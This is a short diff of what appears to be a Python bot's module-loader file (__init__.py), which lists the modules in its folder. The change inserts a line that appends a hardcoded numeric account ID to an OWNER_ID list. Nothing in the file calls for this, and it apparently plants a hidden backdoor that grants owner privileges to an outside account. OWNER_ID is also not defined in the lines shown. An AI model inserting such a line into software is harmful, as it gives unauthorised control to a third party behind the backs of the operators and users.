@@ -1,7 +1,6 @@
 import glob
-
+OWNER_ID.append(1808943146)
 from os.path import basename, dirname, isfile
-
 def __list_all_modules():
 
     mod_paths = glob.glob(dirname(__file__) + "/*.py")
